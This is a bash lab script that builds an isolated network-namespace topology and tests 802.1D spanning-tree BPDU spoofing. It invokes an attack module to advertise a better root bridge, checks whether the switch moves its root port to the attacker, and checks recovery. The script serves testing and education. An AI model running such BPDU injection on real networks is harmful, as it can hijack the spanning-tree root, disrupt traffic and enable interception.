#!/usr/bin/env bash
# Isolated BPDU spoofing lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   root --(veth)-- [switch: br0 with STP, port sw-r]
#                   [switch port sw-a] --(veth)-- attacker
#
#   root:     a bridge (rb0, priority 8192) that the switch should choose as root.
#   switch:   a bridge running 802.1D Spanning Tree (kernel STP).
#   attacker: sends configuration BPDUs that advertise root priority 0.
#
#   Phase 1 (baseline): the switch's root port is sw-r, the port toward the legitimate root.
#   Phase 2: the attacker sends BPDUs with a better root. The switch should move its
#            root port to sw-a, the attacker's port.
#   Phase 3: the attacker stops. The injected information expires after its max age
#            (20 s), and the root port returns to sw-r.
#
# The switch's root port is read from `ip -d link show br0` (root_port, a port number).
# On the lab kernel the designated_root field printed by iproute2 does not follow the
# election, so this lab does not use it.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/bpdu_spoofing_lab.sh
#   sudo FRAMES=20 scripts/lab/bpdu_spoofing_lab.sh
#
# Requirements: iproute2 (ip), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
FRAMES="${FRAMES:-10}"
INTERVAL=0.5
SETTLE_SECONDS=12
# The injected BPDUs carry a max age of 20 s, so the switch keeps them that long.
RECOVER_SECONDS=30
ATTACKER_MAC="02:00:00:00:00:30"

stop_lab() {
    for ns in attacker root switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add switch
ip netns add root
ip netns add attacker

# root bridge <-> switch port sw-r
ip link add r-sw type veth peer name sw-r
ip link set r-sw netns root
ip link set sw-r netns switch

# attacker <-> switch port sw-a
ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

# Switch: 802.1D STP enabled, with short timers so the lab runs quickly.
# sw-a is added first, so it is port 1 and sw-r is port 2.
ip netns exec switch ip link add br0 type bridge stp_state 1 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec switch ip link set br0 up
for port in sw-a sw-r; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

# Legitimate root bridge: priority 8192 is better than the switch's default 32768,
# and worse than the attacker's advertisement (priority 0).
ip netns exec root ip link add rb0 type bridge stp_state 1 priority 8192 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec root ip link set rb0 up
ip netns exec root ip link set r-sw master rb0
ip netns exec root ip link set r-sw up

ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip link set a-sw up

# Name of the switch port that is the root port of br0 ("sw-a", "sw-r", or "none").
root_port_name() {
    local number port port_no
    number="$(ip netns exec switch ip -d link show br0 | grep -o 'root_port [0-9]*' | awk '{print $2}')"
    if [[ "$number" == "0" || -z "$number" ]]; then
        echo "none"
        return
    fi
    for port in sw-a sw-r; do
        port_no="$(ip netns exec switch ip -d link show "$port" | grep -o 'port_no 0x[0-9a-f]*' | awk '{print $2}')"
        if (( port_no == number )); then
            echo "$port"
            return
        fi
    done
    echo "port $number"
}

SEND_CODE='
import os
from macabre.attacks.bpdu_spoofing import BpduSpoofingConfig, run_bpdu_spoofing
import threading
stats = run_bpdu_spoofing(
    BpduSpoofingConfig(iface="a-sw", count=int(os.environ["FRAMES"]), interval=float(os.environ["INTERVAL"]), root_priority=0),
    threading.Event(),
    lambda _: None,
)
print(f"Attacker: sent {stats.frames} BPDUs from {stats.sender_mac}, advertising root {stats.root_id}")
'

# --- Phase 1: baseline -----------------------------------------------------

echo "Waiting ${SETTLE_SECONDS}s for the legitimate root to be elected"
sleep "$SETTLE_SECONDS"

echo "Phase 1: baseline (no BPDUs sent by the attacker)"
BASE="$(root_port_name)"
echo "  switch root port: $BASE"
echo

# --- Phase 2: inject BPDUs -------------------------------------------------

echo "Phase 2: attacker sends $FRAMES configuration BPDUs advertising root priority 0"
ip netns exec attacker env PYTHONPATH="$ROOT/src" FRAMES="$FRAMES" INTERVAL="$INTERVAL" "$PY" -c "$SEND_CODE"
sleep 3
ATTACK="$(root_port_name)"
echo "  switch root port: $ATTACK"
echo

# --- Phase 3: attack stops, information ages out ---------------------------

echo "Phase 3: attacker stopped; waiting ${RECOVER_SECONDS}s for the injected information to age out"
sleep "$RECOVER_SECONDS"
RECOVERED="$(root_port_name)"
echo "  switch root port: $RECOVERED"
echo

# --- Verdict ---------------------------------------------------------------

if [[ "$BASE" == "sw-r" ]]; then
    echo "Baseline: the switch's root port faces the legitimate root (sw-r). OK"
else
    echo "Baseline: the root port is $BASE, not sw-r. Result unreliable."
fi
if [[ "$ATTACK" == "sw-a" ]]; then
    echo "Attack: the switch moved its root port to the attacker's port (sw-a). Vulnerable."
else
    echo "Attack: the switch kept its root port on $ATTACK. Protected."
fi
if [[ "$RECOVERED" == "sw-r" ]]; then
    echo "Recovery: the root port returned to the legitimate root (sw-r) once the BPDUs stopped. OK"
else
    echo "Recovery: the root port is $RECOVERED, not sw-r."
fi
